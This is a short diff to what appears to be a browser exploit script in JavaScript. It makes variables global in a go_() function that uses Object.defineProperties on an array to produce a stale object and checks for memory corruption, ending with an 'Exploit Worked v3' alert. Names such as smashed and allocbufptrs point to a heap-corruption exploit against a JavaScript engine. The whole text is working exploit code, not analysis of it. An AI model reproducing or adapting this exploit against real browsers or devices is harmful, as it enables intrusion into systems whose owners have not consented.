@@ -112,6 +112,9 @@ function smashed(stl) {
 
 
 
+var props = {};
+var stale = {};
+var target = [];
 function go_() {
 	if(smsh.length != 0x10) {
 		smashed();
@@ -129,7 +132,7 @@ function go_() {
 		allocbufptrs();
 		return 10;
 	};
-	var props = {
+	props = {
 		p0: {value: 0},
 		p1: {value: 1},
 		p2: {value: 2},
@@ -144,10 +147,11 @@ function go_() {
 		after: {value: 666}
 	};
 	
-	var target = [];
+	target = [];
 	var before_len = arr.length;
 	Object.defineProperties(target, props);
-	var stale = target.stale;
+	stale = target.stale;
+	
 
 	if(before_len != stale.length){
 		alert("Exploit Worked v3");
